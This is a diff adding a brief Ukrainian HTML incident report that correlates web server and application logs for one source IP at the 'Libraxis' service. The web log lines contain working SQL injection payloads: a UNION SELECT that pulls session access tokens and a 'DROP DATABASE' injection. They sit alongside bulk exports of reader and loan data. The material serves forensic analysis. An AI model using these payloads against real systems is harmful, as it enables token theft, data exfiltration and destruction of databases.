@@ -1,0 +1,10 @@
+<!doctype html><meta charset="utf-8"><style>*{box-sizing:border-box}body{margin:0;color:#182532;background:white;font:18px/1.4 system-ui}main{padding:22px;width:960px}h1{font-size:25px;margin:0 0 12px}h2{font-size:20px;margin:14px 0 6px}pre{white-space:pre-wrap;overflow-wrap:anywhere;font:16px/1.4 monospace;border-top:1px solid #ccd4dc;padding:12px 0}p{margin:8px 0}.ok{color:#185b36;font-weight:600}</style><main><h1>Libraxis — зіставлення подій журналів</h1><p>17.11.2026 · час вебсервера +0200 · джерело 185.220.101.22</p><p>115 HTTP-запитів; 59 з цієї адреси; 20 невдалих входів.</p><h2>Вибірка журналу вебсервера</h2><pre>185.220.101.22 - - [17/Nov/2026:14:05:02 +0200] &quot;POST /auth/login HTTP/1.1&quot; 200 418
+185.220.101.22 - - [17/Nov/2026:14:06:27 +0200] &quot;GET /api/catalog/search?q=&#x27; UNION SELECT user_id,access_token,expires_at,NULL FROM sessions-- - HTTP/1.1&quot; 200 2387
+185.220.101.22 - - [17/Nov/2026:14:06:41 +0200] &quot;GET /api/admin/dashboard HTTP/1.1&quot; 200 2161
+185.220.101.22 - - [17/Nov/2026:14:07:16 +0200] &quot;GET /api/admin/readers/export?format=json HTTP/1.1&quot; 200 684217
+185.220.101.22 - - [17/Nov/2026:14:07:24 +0200] &quot;GET /api/admin/loans/export?format=json HTTP/1.1&quot; 200 1128946
+185.220.101.22 - - [17/Nov/2026:14:08:16 +0200] &quot;GET /api/catalog/search?q=&#x27;; DROP DATABASE catalog1;-- - HTTP/1.1&quot; 500 1934</pre><h2>Відповідні записи прикладного журналу</h2><pre>[AUTH] 17.11.2026 14:05:02 login ok user=shelby
+2026/11/17 14:07:16 ReaderExportService report created readers_20261117_140716.json
+17-Nov-2026 14:07:24 LoanReportGenerator created loans_20261117_140724.json
+[2026-11-17 14:08:16] catalog.ERROR SQLSTATE[3D000]: Invalid catalog name: 1046 No database selected
+14:08:19 database.ERROR connection failed: SQLSTATE[HY000] [1049] Unknown database &#x27;catalog1&#x27;</pre><p>Обсяг двох HTTP-відповідей експорту: 1 813 163 байти.</p></main>
